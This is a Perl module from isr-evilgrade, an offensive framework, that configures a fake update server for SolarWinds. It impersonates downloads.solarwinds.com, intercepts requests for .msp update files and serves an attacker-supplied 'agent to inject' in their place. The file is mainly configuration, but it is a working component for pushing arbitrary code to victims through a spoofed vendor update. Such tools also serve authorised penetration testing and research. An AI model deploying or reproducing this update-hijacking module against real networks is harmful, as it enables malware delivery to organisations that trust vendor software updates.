###############
# solarwinds.pm
#
# Copyright 2020 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::solarwinds;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'    => 'solarwinds',
    'appver'  => '1.0',
    'version' => '<2020.2.1 HF 2',
    'author'  => ['Francisco Amato < famato +[AT]+ faradaysec.com >'],
    'description' => qq{https://www.fireeye.com/blog/products-and-services/2020/12/global-intrusion-campaign-leverages-software-supply-chain-compromise.html, 
        https://www.solarwinds.com/securityadvisory},
    'vh'          => 'downloads.solarwinds.com',
    'request'     => [
        {   'req'    => '.msp',     #regex friendly
            'type'   => 'agent',    #file|string|agent|install
            'method' => '',         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },

    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.msp', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1,
        },

    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
